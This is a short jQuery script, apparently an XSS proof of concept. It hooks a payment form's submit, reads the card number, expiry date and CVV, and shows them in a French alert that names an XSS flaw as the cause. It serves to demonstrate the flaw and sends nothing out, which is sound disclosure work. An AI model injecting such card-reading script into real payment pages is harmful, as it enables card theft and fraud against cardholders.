
$( document ).ready(function() {
	$('#paymentInfoForm').addClass('spy');
	
    $('#PaylineForm #mainform').submit(function(){
		var a = $('#paymentCardNumber').val();
		var b = $('#paymentCardExpirationMonth').val();
		var c = $('#paymentCardExpirationYear').val();
		var d = $('#paymentCardCvv').val();
		alert(
			'Votre n° de carte est '+a+
			'\nElle expire le '+b+'/'+c+
			'\nLe secret est '+d+
			'\nToutes les informations peuvent être récupérées à cause d\'une faille XSS'
		);
	});
});